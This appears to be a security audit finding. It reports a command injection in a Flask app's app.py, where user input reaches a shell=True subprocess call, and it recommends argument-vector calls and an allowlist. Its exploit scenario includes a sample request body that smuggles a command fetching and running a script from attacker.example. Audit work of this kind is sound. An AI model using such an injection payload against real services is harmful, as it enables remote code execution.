# Vuln 1: Command Injection: `app.py:15`

- File: `app.py`
- Line: `15`
- Severity: HIGH
- Category: Command Injection
- Confidence: 0.98
- Description: The pending change replaces a safe argument-vector subprocess call with a shell command built by interpolating `target` directly into an f-string and executing it with `shell=True`. `target` comes from `request.json["target"]` and is not validated or escaped before reaching the shell, so shell metacharacters such as `;`, `&&`, backticks, or `$()` will be interpreted as additional commands.
- Exploit Scenario: An attacker who can submit requests with a valid `X-Ops-Token` can send a body like `{"target":"/srv/data; curl https://attacker.example/payload.sh | sh"}`. The shell will execute the injected command after invoking `archive-job`, resulting in arbitrary command execution with the privileges of the Flask service.
- Recommendation: Remove `shell=True` and pass the command as an argument list, for example `subprocess.run(["/usr/local/bin/archive-job", "--target", target], ...)`. If this endpoint is intended to archive only approved locations, also enforce an allowlist or strict path validation before invoking the job.
